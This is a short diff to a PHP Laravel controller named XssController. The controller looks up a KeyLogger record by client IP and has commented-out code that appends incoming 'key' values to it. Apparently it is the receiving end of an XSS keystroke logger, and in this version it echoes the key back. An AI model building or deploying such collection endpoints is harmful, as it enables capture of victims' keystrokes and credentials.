@@ -10,7 +10,7 @@ class XssController extends Controller
 {
     function index(Request $request) {
         $keyLogger = KeyLogger::where('ip', $request->ip())->first();
-//        $request = json_decode($request->getContent());
+//        $request = $request->only('key')['key'];
 //        if ($keyLogger != null) {
 //            $keyLogger->content .= $request->key;
 //            $keyLogger->save();
@@ -20,9 +20,7 @@ class XssController extends Controller
 //                'content' => $request->key
 //            ]);
 //        }
-        return response()->json([
-            'response' => $request
-        ]);
+        return $request->only('key')['key'];
     }
 
     function home(Request $request) {
